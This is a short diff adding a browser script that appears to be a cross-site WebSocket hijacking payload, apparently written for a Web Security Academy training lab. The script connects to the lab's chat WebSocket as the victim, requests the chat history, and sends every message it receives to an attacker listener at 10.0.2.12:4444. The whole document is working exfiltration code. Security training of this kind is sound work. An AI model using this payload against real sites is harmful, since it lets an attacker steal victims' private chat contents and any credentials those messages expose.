@@ -1,0 +1,11 @@
+<script>
+websocket = new WebSocket('wss://ace41fe51ee92c50800ba7f400ca0034.web-security-academy.net/chat')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+  websocket.send("READY");
+}
+function handleReply(event) {
+  fetch('http://10.0.2.12:4444/?'+event.data, {mode: 'no-cors'})
+}
+</script> 
